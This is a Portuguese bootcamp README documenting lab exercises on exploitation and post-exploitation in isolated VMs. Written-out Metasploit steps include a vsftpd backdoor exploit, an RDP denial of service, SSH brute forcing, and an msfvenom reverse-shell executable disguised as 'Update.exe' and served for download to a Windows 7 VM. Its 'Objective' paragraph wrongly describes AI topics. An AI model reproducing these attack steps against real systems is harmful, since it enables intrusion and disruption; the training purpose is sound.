# Forma√ß√£o Cybersecurity Specialist - Module 4   <img src="../0-aux/logo_boot.png" alt="boot_036" width="auto" height="45">

### Repository: [boot](../../../../)   
### Platform: <a href="../../../">dio   <img src="https://github.com/PedroHeeger/main/blob/main/0-aux/logos/plataforma/dio.jpeg" alt="dio" width="auto" height="25"></a>   
### Software/Subject: <a href="../../">cybersecurity   <img src="https://github.com/PedroHeeger/main/blob/main/0-aux/logos/content/cybersecurity.jpg" alt="cybersecurity" width="auto" height="25"></a>
### Bootcamp: <a href="../">boot_036 (Forma√ß√£o Cybersecurity Specialist)   <img src="../0-aux/logo_boot.png" alt="boot_036" width="auto" height="25"></a>
### Module: 4. Explora√ß√£o de Vulnerabilidade e P√≥s-Explora√ß√£o 

#### <a href="https://github.com/PedroHeeger/my_tech_journey/tree/main/credentials/certificates/bootcamps/cybersecurity/mod/251109_Mod_Exploracao...Pos-Exploracao_PH_DIO.pdf">Certificate</a>

---

This folder refers to Module 4 **Explora√ß√£o de Vulnerabilidade e P√≥s-Explora√ß√£o** from bootcamp [**Forma√ß√£o Cybersecurity Specialist**](../).

### Theme:
- Cybersecurity

### Used Tools:
- Operating System (OS): 
  - Linux   <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/linux/linux-original.svg" alt="linux" width="auto" height="25">
  - Windows 7   <img src="https://github.com/PedroHeeger/main/blob/main/0-aux/logos/software/windows_7.png" alt="windows_7" width="auto" height="25">
  - Windows 11   <img src="https://github.com/PedroHeeger/main/blob/main/0-aux/logos/software/windows11.png" alt="windows11" width="auto" height="25">
- Linux Distribution:
  - Kali Linux   <img src="https://github.com/PedroHeeger/main/blob/main/0-aux/logos/software/kali_linux.png" alt="kali_linux" width="auto" height="25">
- Virtualization: 
  - Oracle VM VirtualBox   <img src="https://github.com/PedroHeeger/main/blob/main/0-aux/logos/software/vm_virtualbox.png" alt="vm_virtualbox" width="auto" height="25">
  - VBoxManage   <img src="https://github.com/PedroHeeger/main/blob/main/0-aux/logos/software/vm_virtualbox.png" alt="vboxmanage" width="auto" height="25">
- Cloud Services:
  - Google Drive   <img src="https://github.com/PedroHeeger/main/blob/main/0-aux/logos/software/google_drive.png" alt="google_drive" width="auto" height="25">
- Language:
  - HTML   <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/html5/html5-original.svg" alt="html" width="auto" height="25">
  - Markdown   <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/markdown/markdown-original.svg" alt="markdown" width="auto" height="25">
  - Python   <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/python/python-original.svg" alt="python" width="auto" height="25">
- Integrated Development Environment (IDE) and Text Editor:
  - Nano   <img src="https://github.com/PedroHeeger/main/blob/main/0-aux/logos/software/nano.png" alt="nano" width="auto" height="25">
  - Visual Studio Code (VS Code)   <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/vscode/vscode-original.svg" alt="vscode" width="auto" height="25">
- Versioning: 
  - Git   <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/git/git-original.svg" alt="git" width="auto" height="25">
- Repository:
  - GitHub   <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/github/github-original.svg" alt="github" width="auto" height="25">
- Library:
  - os   <img src="" alt="os" width="auto" height="25">
  - virtualenv (venv)   <img src="https://github.com/PedroHeeger/main/blob/main/0-aux/logos/frame_library/virtualenv.jpeg" alt="virtualenv" width="auto" height="25">
- Network:
  - ifconfig   <img src="https://github.com/PedroHeeger/main/blob/main/0-aux/logos/software/ifconfig.png" alt="ifconfig" width="auto" height="25">
  - ip   <img src="" alt="ip" width="auto" height="25">
  - ipconfig   <img src="https://github.com/PedroHeeger/main/blob/main/0-aux/logos/software/ipconfig.jpeg" alt="ipconfig" width="auto" height="25">
  - Network Mapper (Nmap)   <img src="https://github.com/PedroHeeger/main/blob/main/0-aux/logos/software/nmap.png" alt="nmap" width="auto" height="25">
  - Wireshark   <img src="https://github.com/PedroHeeger/main/blob/main/0-aux/logos/software/wireshark.png" alt="wireshark" width="auto" height="25">
- Cibersecurity:
  - Damn Vulnerable Web Application (DVWA)   <img src="https://github.com/PedroHeeger/main/blob/main/0-aux/logos/software/dvwa.png" alt="dvwa" width="auto" height="25">
  - Ettercap   <img src="https://github.com/PedroHeeger/main/blob/main/0-aux/logos/software/ettercap.png" alt="ettercap" width="auto" height="25">
  - Metasploit   <img src="https://github.com/PedroHeeger/main/blob/main/0-aux/logos/software/metasploit.png" alt="metasploit" width="auto" height="25">
  - Metasploitable   <img src="https://github.com/PedroHeeger/main/blob/main/0-aux/logos/software/metasploit.png" alt="metasploitable" width="auto" height="25">
  - Meterpreter; Meta-Interpreter   <img src="https://github.com/PedroHeeger/main/blob/main/0-aux/logos/software/meterpreter.jpg" alt="meterpreter" width="auto" height="25">
  - msfconsole   <img src="https://github.com/PedroHeeger/main/blob/main/0-aux/logos/software/metasploit.png" alt="msfconsole" width="auto" height="25">
  - msfvenom   <img src="https://github.com/PedroHeeger/main/blob/main/0-aux/logos/software/metasploit.png" alt="msfvenom" width="auto" height="25">
- SysAdmin:
  - Task Manager   <img src="https://github.com/PedroHeeger/main/blob/main/0-aux/logos/software/windows_task_manager.png" alt="windows_task_manager" width="auto" height="25">
  - User Account Control (UAC)   <img src="" alt="uac" width="auto" height="25">

---

### Bootcamp Module 4 Structure
4. <a name="item4">Explora√ß√£o de Vulnerabilidade e P√≥s-Explora√ß√£o</a><br>
  4.1. <a href="#item4.1">T√©cnicas de Explora√ß√£o de Vulnerabilidades</a><br>
  4.2. <a href="#item4.2">P√≥s-Explora√ß√£o em Sistemas Comprometidos</a><br>
  4.3. <a href="#item4.3">Man in the Middle: Ataques e Mitiga√ß√µes</a><br>
  4.4. <a href="#item4.4">Desafio de projeto: Entendendo um Ransomware na Pr√°tica com Python</a><br>
  4.5. Materiais Complementares - Explora√ß√£o e P√≥s Explora√ß√£o<br>
  4.6. Avalie a Forma√ß√£o Cybersecurity Specialist<br>

---

### Objective:
O objetivo deste m√≥dulo do bootcamp foi introduzir conceitos fundamentais para melhor compreens√£o da Intelig√™ncia Articial. Conceitos como IA Geral, IA Restrita, Machine Learning (Aprendizado Profundo), Deep Learning, Redes Neurais, IAs Generativas, Processamento de Linguagem Natural, foram abordados. Tamb√©m foi detalhado minuciosamente como s√£o divididas as redes neurais e que a partir delas surgem as IAs Generativas.

### Folder Structure:
- [README.md](./README.md): Este documento de README, escrito em **Markdown**, descrevendo todo conte√∫do das atividades desse m√≥dulo.
- [dp_ransomware](./dp_ransomware/): Pasta contendo os tr√™s arquivos (dois em **Python** e um de texto) do desafio de projeto de simula√ß√£o de um ransomware.
- [meterprete.rc](meterpreter.rc): Arquivo de script do **Meterpreter** que automatizava o processo de criar a sess√£o inicial (sem privil√©gios administrativos).

### Development:
O desenvolvimento deste m√≥dulo do bootcamp foi dividido em quatro cursos. Abaixo √© explicado o que foi desenvolvido em cada uma dessas atividades.

<a name="item4.1"><h4>4.1 T√©cnicas de Explora√ß√£o de Vulnerabilidades</h4></a>[Back to summary](#item4) | <a href="https://github.com/PedroHeeger/my_tech_journey/blob/main/credentials/certificates/online_courses/cybersecurity/251018...Tecnicas...Exploracao_Vulnerabilidades_PH_DIO.pdf">Certificate</a>

‚ö†Ô∏è Explora√ß√£o de Falhas, Backdoors e Amea√ßas Remotas   
A explora√ß√£o de falhas descreve o processo de encontrar vulnerabilidades em sistemas e us√°-las para obter acesso, executar c√≥digo ou extrair dados. Embora t√©cnicas ofensivas tamb√©m sejam empregadas por profissionais (pentesters) para fortalecer a defesa, elas representam riscos reais quando aplicadas por agentes maliciosos. Por isso √© fundamental entender os vetores comuns e como mitig√°-los.

üìÅ FTP ‚Äî riscos e limita√ß√µes   
O FTP √© um protocolo antigo para transfer√™ncia de arquivos ainda presente em muitas redes. Por n√£o ter sido projetado com controles de seguran√ßa modernos, ele costuma apresentar problemas como autentica√ß√£o an√¥nima permitida, possibilidade de travessia de diret√≥rios, exposi√ß√£o de informa√ß√µes em texto claro e vetores para malware. Essas fragilidades tornam servidores FTP alvos frequentes para coleta de arquivos sens√≠veis e pivoteamento em redes comprometidas.

Vulnerabilidades t√≠picas associadas ao FTP:
- Autentica√ß√£o an√¥nima habilitada.
- Falhas que permitem navegar para diret√≥rios al√©m do esperado (directory traversal).
- Exposi√ß√£o de credenciais em texto simples.
- Uso por campanhas de malware para distribuir cargas maliciosas.

Mitiga√ß√µes recomendadas:
- Evitar FTP em favor de protocolos seguros (SFTP/FTPS).
- Restringir acessos e desabilitar login an√¥nimo.
- Monitorar e auditar transfer√™ncias de arquivos.
- Segmentar rede para limitar o alcance de compromissos.

üß∞ Ferramentas ofensivas   
Frameworks como o Metasploit s√£o usados por profissionais de seguran√ßa e por atacantes para testar ou explorar sistemas. Eles entregam m√≥dulos de explora√ß√£o, geradores de payloads, interfaces de controle e mecanismos de registro. Esse conhecimento √© √∫til para defesa (por exemplo, identificar assinaturas de ataque e validar controles), mas n√£o deve incluir instru√ß√µes operacionais que facilitem invas√µes.

Componentes e utilit√°rios comuns:
- msfconsole: console interativo em modo texto; o ponto principal para carregar m√≥dulos, ajustar op√ß√µes, executar scanners e gerenciar sess√µes.
- msfweb / Metasploit Web UI: interface via navegador (quando dispon√≠vel), que oferece fluxo visual para navegar entre m√≥dulos, sess√µes e relat√≥rios.
- msfvenom (muitas vezes citado como msfplayload): utilit√°rio para gerar e customizar payloads (unificou funcionalidades antigas como msfpayload e msfencode).
- msfcli: interface de execu√ß√£o via linha de comando usada historicamente para automa√ß√£o; hoje muitas implementa√ß√µes preferem msfconsole com scripts.
- msflogdump: arquivos e rotinas que registram eventos e sess√µes; essenciais para revis√£o, auditoria e rastreabilidade dos testes.

üß© Payloads   
Payload √© a ‚Äúcarga √∫til‚Äù que ser√° executada no sistema alvo ap√≥s explora√ß√£o bem-sucedida ‚Äî ou seja, o c√≥digo que realiza a a√ß√£o desejada (abrir um shell, criar um canal de comando e controle, coletar credenciais, etc.). Em testes controlados, payloads s√£o usados para validar impacto e demonstrar riscos, sempre dentro de escopo e autoriza√ß√£o.

Tipos de payloads:
- Single (single-stage):
  - O que √©: payload autossuficiente ‚Äî toda a funcionalidade √© entregue e executada de uma s√≥ vez.
  - Vantagem: simples e direto; n√£o depende de transfer√™ncias adicionais.
  - Limita√ß√£o: normalmente maior e pode ser mais f√°cil de detectar por defesa baseada em assinaturas.
- Stager (estagiador):
  - O que √©: pequeno payload inicial cujo √∫nico prop√≥sito √© estabelecer um canal entre atacante e v√≠tima e, em seguida, baixar/negociar o payload maior (stage).
  - Vantagem: reduz a quantidade de c√≥digo inicial (menor ‚Äúpegada‚Äù na mem√≥ria) e permite transferir o payload completo depois; √∫til para contornar restri√ß√µes iniciais.
  - Limita√ß√£o: requer comunica√ß√£o adicional para trazer o stage, o que aumenta pontos de controle que defensores podem monitorar.
- Stage (stage / staged payload):
  - O que √©: o payload maior e funcional que √© transferido pelo stager. Cont√©m as capacidades completas (por exemplo, um shell interativo avan√ßado ou um agente de controle).
  - Vantagem: permite modularidade ‚Äî o stager √© m√≠nimo e o stage traz as funcionalidades quando seguro/poss√≠vel.
  - Limita√ß√£o: depende do stager para entrega; se a transfer√™ncia for interrompida, o stage n√£o chega.

Exemplo pr√°tico (apenas conceitual): uma cadeia stager ‚Üí stage permite primeiro abrir um pequeno canal (stager) e depois carregar um agente completo (stage) que roda em mem√≥ria. Em contraste, um single j√° cont√©m tudo no primeiro envio.

üñ•Ô∏è RDP   
O Remote Desktop Protocol (RDP) permite controle remoto de esta√ß√µes e servidores Windows e costuma operar na porta TCP 3389. Quando exposto sem prote√ß√£o, √© um vetor comum para acesso n√£o autorizado, movimento lateral e implanta√ß√£o de ransomwares.

Riscos associados ao RDP:
- Ataques de for√ßa bruta contra credenciais.
- Explora√ß√£o de vulnerabilidades do servi√ßo para execu√ß√£o remota.
- Uso como ponte para ataques internos ap√≥s comprometimento.

Boas pr√°ticas:
- Habilitar autentica√ß√£o multifator e senhas fortes.
- Aplicar pol√≠ticas de bloqueio e limites de tentativas para prevenir for√ßa bruta.
- Restringir acesso via firewall (permitir somente IPs ou VPNs confi√°veis).
- Usar controles baseados em fun√ß√£o (RBAC) e monitoramento de sess√µes.

üîê SSH ‚Äî acesso remoto seguro   
O SSH fornece um canal criptografado para administra√ß√£o remota (porta 22 por padr√£o). Ataques de for√ßa bruta e credenciais fracas continuam sendo problemas recorrentes quando o servi√ßo n√£o √© bem configurado.

Recomenda√ß√µes:
- Desabilitar autentica√ß√£o por senha e usar chaves p√∫blicas/privadas.
- Limitar acessos por lista de controle e registrar tentativas de login.
- Atualizar o software e aplicar pol√≠ticas de rota√ß√£o de chaves/senhas.

üï≥Ô∏è Backdoors e persist√™ncia   
Backdoors s√£o mecanismos que permitem acesso continuado a sistemas comprometidos (por exemplo, implantes instalados por malware). Eles podem ser usados para espionagem, controle remoto, distribui√ß√£o de ransomware ou minera√ß√£o il√≠cita. A detec√ß√£o costuma depender de monitoramento de comportamento e an√°lise de tr√°fego.

Medidas de defesa:
- Monitoramento cont√≠nuo de rede e endpoints.
- Controle rigoroso de instala√ß√£o de software e privil√©gio m√≠nimo.
- Pol√≠ticas de rota√ß√£o de credenciais e verifica√ß√£o de integridade de arquivos.
- Uso de EDR/antiv√≠rus e processos de resposta a incidentes.

üß™ Meterpreter   
O meterpreter √© um exemplo de payload utilizado em testes de seguran√ßa que roda inteiramente em mem√≥ria, minimizando tra√ßos em disco. Conceitualmente, payloads em mem√≥ria complicam a detec√ß√£o por t√©cnicas forenses tradicionais; por isso, os defensores devem combinar prote√ß√£o em camadas, monitoramento comportamental e controles de privil√©gio para mitigar esse tipo de amea√ßa.

‚úÖ Resumo de recomenda√ß√µes gerais   
- Preferir protocolos seguros (SFTP/FTPS, SSH) em vez de servi√ßos legados sem criptografia (como FTP).
- Restringir e monitorar acessos remotos (RDP/SSH) com autentica√ß√£o forte e controles de rede.
- Implementar segmenta√ß√£o de rede e privil√©gios m√≠nimos para limitar impacto de compromissos.
- Manter sistemas atualizados e contar com detec√ß√£o baseada em comportamento al√©m de assinaturas.
- Tratar ferramentas ofensivas como insumos de teste ‚Äî n√£o como roteiros operacionais ‚Äî e documentar todas as a√ß√µes autorizadas.

##### Parte Pr√°tica

Neste curso, foram realizadas quatro explora√ß√µes de vulnerabilidades, sendo duas delas tendo como alvo a VM do **Metasploitable**, falhas FTP e SSH, uma no **Windows XP**, ataque DOS, enquanto a √∫ltima, na VM do **Windows 7**, cria√ß√£o e execu√ß√£o de um backdoor em um execut√°vel.

A primeira explora√ß√£o foi a de falhas FTP, para isso foi preciso acessar a VM **Metasploitable** para criar uma flag simples. Ap√≥s acessar a conta `msfadmin:msfadmin`, utilizou-se o editor **Nano** para criar o arquivo `flag.txt` com o conte√∫do `flag`. O objetivo do exerc√≠cio era localizar esse arquivo a partir da VM atacante (**Kali Linux**) usando o **Metasploit**, simulando um cen√°rio de *Capture The Flag (CTF)*. No Kali, abriu-se o console do **Metasploit** com `msfconsole`.

Dentro do **msfconsole** realizou-se a busca por m√≥dulos de exploits relacionados ao servidor FTP com `search vsftpd` e, em seguida, obteve-se mais detalhes sobre o exploit espec√≠fico com `info exploit/unix/ftp/vsftpd_234_backdoor` ‚Äî tratava-se de uma backdoor conhecida na vers√£o 2.3.4 do **VSFTPD**. Para selecionar esse m√≥dulo foi executado `use exploit/unix/ftp/vsftpd_234_backdoor`. As op√ß√µes do exploit foram checadas com `show options` (a porta padr√£o era `21`) e o alvo foi configurado com `set RHOSTS 192.168.56.102` (IP da VM **Metasploitable**). Em seguida, os payloads dispon√≠veis para esse m√≥dulo foram listados com `show payloads`, escolhendo `payload/cmd/unix/interact` via `set payload 0`. Ap√≥s confirmar as op√ß√µes (`show options`), o exploit foi disparado com `exploit`, conforme imagem 01.

<div align="Center"><figure>
    <img src="../0-aux/md4-img01.png" alt="img01"><br>
    <figcaption>Imagem 01.</figcaption>
</figure></div><br>

Ao explorar com sucesso, abriu-se uma sess√£o no servidor FTP da **Metasploitable** ‚Äî todos os comandos seguintes foram executados na m√°quina comprometida. Para verificar a conectividade e confirmar o contexto, executou-se `ifconfig` na shell remota, confirmando o IP da **Metasploitable** antes de proceder √† busca pelo arquivo `flag.txt`.

Com o acesso remoto obtido, navegou-se at√© o diret√≥rio do usu√°rio com `cd /home/msfadmin` e exibiu-se o conte√∫do da flag com `cat flag.txt`, confirmando o sucesso da explora√ß√£o (conforme evidenciado na imagem 02).

<div align="Center"><figure>
    <img src="../0-aux/md4-img02.png" alt="img02"><br>
    <figcaption>Imagem 02.</figcaption>
</figure></div><br>

Em um segundo exerc√≠cio de explora√ß√£o, o alvo passou a ser a VM **Windows XP**, onde foi testada uma t√©cnica de DoS contra o servi√ßo **Remote Desktop Protocol (RDP)**. Para conectar a m√°quina √† mesma rede do atacante, a interface foi alterada de NAT para host-only com `VBoxManage modifyvm "WinXP" --nic1 hostonly --hostonlyadapter1 "VirtualBox Host-Only Ethernet Adapter"`, garantindo que a VM recebesse um IP na sub-rede `192.168.56.0/24`. Antes de prosseguir, acessou-se a VM para confirmar que o **Remote Desktop** estava habilitado e executou-se `ipconfig` no **Command Prompt** para identificar o endere√ßo IP atribu√≠do.  

No Kali, novamente foi aberto o console do **Metasploit** (`msfconsole`) e pesquisou-se por m√≥dulos RDP com `search windows/rdp`, localizando o exploit `auxiliary/dos/windows/rdp/ms12_020_maxchannelids`. O m√≥dulo foi selecionado com `use auxiliary/dos/windows/rdp/ms12_020_maxchannelids` e o alvo configurado via `set RHOSTS 192.168.56.109` (IP da VM **Windows XP**). Como o efeito do exploit era imediato, as telas das duas VMs foram mantidas lado a lado para observa√ß√£o. Ao executar `run` o exploit provocou a tela azul do **Windows** e a subsequente reinicializa√ß√£o da VM. A imagem 03 ilustra o momento do ataque.  

<div align="Center"><figure>
    <img src="../0-aux/md4-img03.png" alt="img03"><br>
    <figcaption>Imagem 03.</figcaption>
</figure></div><br>

A terceira t√©cnica aplicada explorou falhas de autentica√ß√£o via SSH na VM **Metasploitable**. No **msfconsole** do **Kali Linux** pesquisou-se por m√≥dulos relacionados com `search ssh_login` e selecionou-se o scanner `auxiliary/scanner/ssh/ssh_login` com `use auxiliary/scanner/ssh/ssh_login`. Ao consultar `info` verificaram-se os par√¢metros necess√°rios: entre eles, dois ficheiros de wordlist ‚Äî um para nomes de usu√°rio e outro para senhas.

Foram ent√£o criadas wordlists locais com `nano password.txt` (uma senha por linha: `test`, `password`, `msfadmin`) e `nano user.txt` (mesmos valores, agora como usu√°rios). Apesar do **msfconsole** estar aberto, era poss√≠vel interagir com o sistema **Kali** sem precisar fech√°-lo, por isso os arquivos foram salvos com o **Nano** no diret√≥rio corrente (`/root`).

No m√≥dulo o caminho para esses arquivos foram configurados com `set USER_FILE /root/user.txt` e `set PASS_FILE /root/password.txt`, e o alvo foi definido com `set RHOSTS 192.168.56.102` (IP da **Metasploitable**). Ao executar `exploit`, o m√≥dulo iniciou um ataque de for√ßa bruta SSH utilizando as wordlists fornecidas; quando uma combina√ß√£o v√°lida foi encontrada, o **Metasploit** abriu uma sess√£o remota.

A lista de sess√µes ativas p√¥ode ser visualizada com `sessions` (ou `sessions -l`) e, para interagir com uma sess√£o espec√≠fica, foi usado `sessions -i 1`. Ap√≥s abrir a sess√£o, foi executado `ip addr` para confirmar o endere√ßo IP da **Metasploitable**, conforme ilustrado na imagem 04.

<div align="Center"><figure>
    <img src="../0-aux/md4-img04.png" alt="img04"><br>
    <figcaption>Imagem 04.</figcaption>
</figure></div><br>

A √∫ltima explora√ß√£o consistiu na constru√ß√£o de um backdoor atrav√©s de um artefato malicioso. De modo geral, um backdoor √© um mecanismo que permite acesso n√£o autorizado a um aplicativo, sistema ou rede, contornando controles de seguran√ßa. Diferentes classes de ataque podem se valer de backdoors ‚Äî por exemplo, spyware, ransomware, ataques DDoS e cryptojacking. Neste exerc√≠cio, o acesso n√£o autorizado √† VM alvo (**Windows 7**) foi estabelecido a partir do console do **Metasploit** no **Kali Linux**.

Para a atividade foi utilizado o **Meterpreter** (Meta-Interpreter), um payload carregado em mem√≥ria que evita deixar vest√≠gios em disco. O **Meterpreter** fornece um shell remoto interativo e um conjunto de extens√µes para executar tarefas p√≥s-explora√ß√£o ‚Äî como upload/download de arquivos, captura de credenciais, keylogging, migra√ß√£o de processos e persist√™ncia.

Como a m√°quina alvo desta etapa era a VM **Windows 7**, a interface de rede foi alterada de NAT para host-only com `VBoxManage modifyvm "Win7" --nic1 hostonly --hostonlyadapter1 "VirtualBox Host-Only Ethernet Adapter"` para garantir que a VM recebesse um IP dentro da sub-rede `192.168.56.0/24` e ficasse na mesma rede da m√°quina atacante. Em seguida a VM foi inicializada e verificou-se o IP atribu√≠do via `ipconfig`.

A constru√ß√£o do backdoor com **Meterpreter** envolvia duas partes: a m√°quina atacante, que hospedava um *listener* (handler) esperando a conex√£o, e a m√°quina alvo, que precisa executar o artefato malicioso para iniciar a comunica√ß√£o.  

Para cria√ß√£o do artefato malicioso, foi utilizado o **msfvenom** do **Metasploit**. O **msfvenom** constru√≠a esse artefato definindo um payload do **Meterpreter** de *reverse shell*, passando as configura√ß√µes da m√°quina alvo (arquitetura/plataforma), o nome e o formato do artefato, que no caso foi o execut√°vel `Update.exe`, al√©m das configura√ß√µes de rede. O comando executado foi: `msfvenom -p windows/meterpreter/reverse_tcp -a x86 platform windows -f exe LHOST=192.168.56.101 LPORT=4444 -o Update.exe`. Esse comando criava um bin√°rio (artefato) que, ao ser executado na m√°quina alvo, tentava conectar de volta ao host e porta informados (`LHOST`/`LPORT`), permitindo ao handler do **Metasploit** assumir a sess√£o.

Com o bin√°rio pronto, optou-se por disponibiliz√°-lo via um servidor web para simular o envio ao usu√°rio alvo (engenharia social). Para isso iniciou-se o servidor Apache (`service apache2 start`) e o execut√°vel foi copiado para a pasta p√∫blica do servidor (`cp Update.exe /var/www/html`). 

No **Kali**, abriu-se novamente o console do **Metasploit** (`msfconsole`) e o listener foi preparado com `use multi/handler` para sele√ß√£o do m√≥dulo, seguido de `set payload windows/meterpreter/reverse_tcp` para definir o payload, `set LHOST 192.168.56.101` para indicar quem receberia o shell reverso (a pr√≥pria m√°quina **Kali Linux**) e `set LPORT 4444` para definir a porta. Essas configura√ß√µes de rede tinham que ser as mesmas definidas no artefato malicioso para que a comunica√ß√£o fosse estabelecida. Em seguida foi executado o comando `run` para executar e aguardar a conex√£o de retorno.

Na GUI da VM **Windows 7** abriu-se o navegador e acessou-se o endere√ßo do servidor web hospedado na m√°quina atacante (`http://192.168.56.101/Update.exe`). O navegador pediu confirma√ß√£o para baixar e instalar o arquivo; ap√≥s instala√ß√£o, uma sess√£o **Meterpreter** de retorno foi estabelecida, conforme evidenciado na imagem 05. A partir desse ponto, todos os comandos executados na sess√£o **Meterpreter** foram executados diretamente na VM **Windows 7**.

<div align="Center"><figure>
    <img src="../0-aux/md4-img05.png" alt="img05"><br>
    <figcaption>Imagem 05.</figcaption>
</figure></div><br>

As sess√µes podiam ser enviadas para segundo plano com `background`. Para listar as sess√µes ativas, executava-se `sessions`, e para retomar uma sess√£o espec√≠fica utilizava-se, por exemplo, `session 1` ‚Äî que correspondia √† primeira sess√£o criada. Essa sess√£o tamb√©m poderia ser a segunda, j√° que, durante a explora√ß√£o de falhas em SSH, havia sido estabelecida outra sess√£o. Vale ressaltar que as sess√µes s√£o perdidas quando o **msfconsole** √© fechado; somente enquanto o console permanecer aberto as sess√µes ficam dispon√≠veis.

<a name="item4.2"><h4>4.2 P√≥s-Explora√ß√£o em Sistemas Comprometidos</h4></a>[Back to summary](#item4) | <a href="https://github.com/PedroHeeger/my_tech_journey/blob/main/credentials/certificates/online_courses/cybersecurity/251105_Pos-Exploracao...Comprometidos_PH_DIO.pdf">Certificate</a>

üõ†Ô∏è P√≥s-explora√ß√£o   
A p√≥s-explora√ß√£o envolve as a√ß√µes realizadas ap√≥s a abertura de uma sess√£o bem-sucedida em um sistema alvo. Uma sess√£o pode ser um shell simples ou um ambiente mais avan√ßado como o Meterpreter. Nessa fase, o objetivo √© manter acesso ao dispositivo comprometido, coletar informa√ß√µes de valor, mapear o ambiente interno e preparar exfiltra√ß√£o de dados sem ser detectado. As atividades devem ser conduzidas com cautela, pois qualquer ru√≠do adicional pode ativar mecanismos de detec√ß√£o e levar √† perda do acesso.

üîÅ Fluxo de atividades   
O processo de um ataque ou teste costuma seguir um fluxo organizado que ajuda a estruturar a opera√ß√£o e o relat√≥rio:  
- **Setup (Configura√ß√£o):** preparo do ambiente e ferramentas necess√°rias antes de iniciar as a√ß√µes (ex.: cria√ß√£o de m√°quinas, listeners, e defini√ß√£o de objetivos).  
- **Discovery (Descoberta):** varredura e identifica√ß√£o de alvos e recursos vis√≠veis na rede (ex.: hosts ativos, portas abertas, servi√ßos).  
- **Enumeration (Enumera√ß√£o):** coleta detalhada de informa√ß√µes espec√≠ficas sobre servi√ßos, usu√°rios, compartilhamentos e vers√µes de software para encontrar vetores de ataque.  
- **Detection (Detec√ß√£o):** identifica√ß√£o de mecanismos de defesa e sinais que podem revelar presen√ßa do atacante (ex.: IDS/IPS, logs, antiv√≠rus) ‚Äî e avaliar o risco de ser detectado.  
- **Exploitation (Explora√ß√£o):** explora√ß√£o de vulnerabilidades ou credenciais para obter acesso ao sistema alvo (ex.: execu√ß√£o de exploits, for√ßa bruta, explora√ß√£o de misconfigurations).  
- **Post Exploitation (P√≥s-explora√ß√£o):** a√ß√µes realizadas ap√≥s obter acesso, como movimenta√ß√£o lateral, escalonamento de privil√©gios, coleta e exfiltra√ß√£o de dados, e estabelecimento de persist√™ncia.  
- **Reporting (Relat√≥rio):** documenta√ß√£o t√©cnica e executiva das atividades, evid√™ncias e impacto obtido durante o teste ou ataque.  
- **Read-Out (Apresenta√ß√£o dos resultados):** comunica√ß√£o dos achados para stakeholders; explicar riscos, evid√™ncias e recomenda√ß√µes de forma compreens√≠vel.  
- **Remediation (Remedia√ß√£o):** aplica√ß√£o de corre√ß√µes e mitiga√ß√£o das vulnerabilidades identificadas (ex.: patches, mudan√ßas de configura√ß√£o, revoga√ß√£o de credenciais).  
- **Final Testing (Testes finais):** verifica√ß√£o posterior para confirmar que as remedia√ß√µes foram eficazes e que o vetor de ataque n√£o √© mais explor√°vel.

üîê Escalonamento de privil√©gios   
O escalonamento de privil√©gios √© uma t√©cnica central na p√≥s-explora√ß√£o: consiste em buscar formas de elevar direitos dentro do sistema alvo (por exemplo, de usu√°rio comum para administrador/root). Esse passo permite acesso a √°reas e dados restritos, facilita a cria√ß√£o de persist√™ncia mais robusta e amplia a capacidade de exfiltra√ß√£o. M√©todos comuns incluem explora√ß√£o de vulnerabilidades locais, abusos de configura√ß√µes incorretas, credenciais armazenadas localmente e explora√ß√£o de servi√ßos com permiss√µes excessivas.

üß© Tipos de m√≥dulos e a√ß√µes comuns   
Durante a p√≥s-explora√ß√£o, s√£o usados m√≥dulos e t√©cnicas com finalidades espec√≠ficas:  
- Extract credentials (Extra√ß√£o de credenciais): busca e extra√ß√£o de credenciais armazenadas (hashes, senhas em arquivos, caches).  
- Privilege escalation modules (M√≥dulos de escalonamento de privil√©gios): m√≥dulos que procuram vetores de eleva√ß√£o de privil√©gio.  
- Information gathering (Coleta de informa√ß√£o): coleta de informa√ß√µes sobre o sistema, rede, usu√°rios, servi√ßos e software instalado.  
- Spy / Capture (Espionagem / Captura): captura de dados em tempo real, como keylogging, capturas de tela ou grava√ß√£o de sess√µes.

üß∞ Metasploit e persist√™ncia   
O Metasploit oferece recursos para automatizar e facilitar tarefas de p√≥s-explora√ß√£o. Um exemplo √© o script *persistence*, que auxilia na configura√ß√£o de um listener persistente (por exemplo, um Meterpreter que reconecta) no sistema da v√≠tima. A persist√™ncia permite que o atacante mantenha acesso ap√≥s reinicializa√ß√µes ou tentativas de limpeza, mas tamb√©m aumenta o risco de detec√ß√£o se implementada de forma ruidosa.

üìù Conclus√£o   
A p√≥s-explora√ß√£o √© uma etapa cr√≠tica e delicada: permite extrair maior valor de uma intrus√£o, mas exige t√©cnica e discri√ß√£o para evitar detec√ß√£o. O foco costuma ser manter acesso (persist√™ncia), ampliar privil√©gios e coletar informa√ß√µes relevantes para os objetivos do atacante ou do teste, sempre registrando as a√ß√µes para fins de relat√≥rio e eventual remedia√ß√£o.

##### Parte Pr√°tica

Durante a parte pr√°tica desse curso foram realizadas quatro p√≥s-explora√ß√µes: escalonamento de privil√©gios, extra√ß√£o de dados, execu√ß√£o de diversos m√≥dulos, inclusive via script, e persist√™ncia de sess√£o. Todas as a√ß√µes ocorreram na m√°quina virtual **Windows 7** do **Oracle VM VirtualBox**, ap√≥s a cria√ß√£o e execu√ß√£o do backdoor com **Metasploit** realizada na √∫ltima explora√ß√£o do curso anterior.

A primeira etapa de p√≥s-explora√ß√£o foi o escalonamento de privil√©gios e deu sequ√™ncia √† cria√ß√£o do backdoor no **Windows 7**. No **Kali** o console do **Metasploit** (`msfconsole`) foi aberto e o mesmo listener foi novamente preparado com os seguintes comandos:
- `use multi/handler`: selecionava o m√≥dulo que recebia conex√µes de payloads reversos.  
- `set payload windows/meterpreter/reverse_tcp`: definia o payload de shell reverso do **Meterpreter**.
- `set LHOST 192.168.56.101`: definia o IP da m√°quina que receberia a conex√£o (a pr√≥pria **Kali**).  
- `set LPORT 4444`: definia a porta de escuta. Tinha que ser a mesma definida no artefato malicioso.
- `run`: iniciava o handler e aguardava a conex√£o de retorno.

